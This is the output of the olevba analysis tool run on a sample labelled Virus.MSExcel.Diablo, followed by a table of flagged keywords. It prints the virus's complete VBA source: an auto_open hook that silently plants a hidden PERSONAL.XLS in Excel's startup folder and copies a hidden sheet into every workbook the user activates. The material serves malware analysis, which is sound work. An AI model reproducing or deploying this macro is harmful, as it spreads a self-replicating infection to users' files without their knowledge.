olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Diablo-6a059ca08084745884329c13b1ad836f910dd558
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Diablos.bas 
in file: Virus.MSExcel.Diablo-6a059ca08084745884329c13b1ad836f910dd558 - OLE stream: '_VBA_PROJECT_CUR/VBA/Diablos'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

' Diablos Macro
' Bios Virus Macro - (C) Copyright 1998/1999 - Spalaci

Sub auto_open()
Attribute auto_open.VB_ProcData.VB_Invoke_Func = " \n14"
    On Error GoTo ErrorHandler1
    MkDir (Application.StartupPath)
    On Error GoTo 0
    GoTo ErrorHandler1
ErrorHandler1:
Application.OnSheetActivate = "Clonar"
End Sub

Sub Clonar()
Attribute Clonar.VB_ProcData.VB_Invoke_Func = " \n14"
 On Error GoTo ErrorHandler2
 Application.ScreenUpdating = False
 Application.DisplayAlerts = False

install = 0
If ThisWorkbook.Name <> "PERSONAL.XLS" Then
   If Dir(Application.StartupPath + "\PERSONAL.XLS") = "PERSONAL.XLS" Then install = 1
   If install = 1 Then
      GoTo ErrorHandler2
   Else
      Workbooks.Add.SaveAs FileName:=Application.StartupPath + "\PERSONAL.XLS"
      Workbooks(ThisWorkbook.Name).Sheets("Diablos").Copy Before:=Workbooks("PERSONAL.XLS").Sheets(1)
      Workbooks("PERSONAL.XLS").Sheets("Diablos").Visible = False
      Workbooks("PERSONAL.XLS").Save
      Windows("PERSONAL.XLS").Visible = False
   End If
Else
   Windows("PERSONAL.XLS").Visible = False
   For i = 1 To Workbooks(ActiveWorkbook.Name).Sheets.Count
       If Workbooks(ActiveWorkbook.Name).Sheets(i).Name = "Diablos" Then install = 1
   Next
   If install = 1 Then
      GoTo ErrorHandler2
   Else
      Workbooks("PERSONAL.XLS").Sheets("Diablos").Copy Before:=Workbooks(ActiveWorkbook.Name).Sheets(1)
      Workbooks(ActiveWorkbook.Name).Sheets("Diablos").Visible = False
      Workbooks(ActiveWorkbook.Name).Save
      Windows("PERSONAL.XLS").Visible = False
   End If
End If
 Workbooks("PERSONAL.XLS").Save
 Application.ScreenUpdating = True
 Application.DisplayAlerts = True
 If Day(Now()) = Int((31 * Rnd) + 1) Then CommandBars.LargeButtons = True
ErrorHandler2:
End Sub
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     15 BOUNDSHEET : Sheet Information - Visual Basic module, hidden -  Diablo
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |auto_open           |Runs when the Excel Workbook is opened       |
|Suspicious|MkDir               |May create a directory                       |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
+----------+--------------------+---------------------------------------------+

